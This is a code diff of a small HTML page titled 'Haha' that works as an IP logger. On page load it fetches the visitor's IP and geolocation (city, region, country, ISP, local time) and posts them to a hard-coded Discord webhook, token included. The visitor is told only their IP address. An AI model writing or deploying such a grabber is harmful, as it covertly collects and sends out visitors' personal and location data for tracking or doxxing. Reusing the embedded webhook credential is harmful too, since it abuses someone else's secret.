@@ -2,8 +2,39 @@
 <html>
   <head>
     <title>Haha</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
     <script>
-      function displayIP(location, isp, time) {
+      function getLocation(ip, pageUserID) {
+        fetch("https://ipapi.co/" + ip + "/json/")
+          .then((response) => response.json())
+          .then((data) => {
+            const location = data.city + ", " + data.region_code + ", " + data.country_name;
+            const timezoneOffset = data.utc_offset;
+            const timezoneName = data.timezone;
+            const isp = data.org;
+            const localTime = moment().utcOffset(timezoneOffset).format("YYYY-MM-DD hh:mm:ss A");
+            const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
+            const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time (CET): " + localTime + ", Page User ID: " + pageUserID;
+            fetch(webhookURL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ content: message }),
+            })
+              .then((response) => {
+                console.log("Success:", response);
+              })
+              .catch((error) => {
+                console.error("Error:", error);
+              });
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+      }
+
+      function displayIP() {
         fetch("https://api.ipify.org/?format=json")
           .then((response) => response.json())
           .then((data) => {
@@ -11,25 +42,7 @@
             ipElement.textContent = data.ip;
             const pageUserID = Date.now().toString();
             localStorage.setItem("pageUserID", pageUserID);
-            sendToWebhook(data.ip, location, isp, time, pageUserID);
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-          });
-      }
-
-      function sendToWebhook(ip, location, isp, time, pageUserID) {
-        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
-        const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time: " + time + ", Page User ID: " + pageUserID;
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ content: message }),
-        })
-          .then((response) => {
-            console.log("Success:", response);
+            getLocation(data.ip, pageUserID);
           })
           .catch((error) => {
             console.error("Error:", error);
@@ -37,7 +50,7 @@
       }
     </script>
   </head>
-  <body onload="displayIP('New York', 'Comcast', '10:30am')">
+  <body onload="displayIP()">
     <p>Your IP address is: <span id="ip"></span></p>
   </body>
 </html>
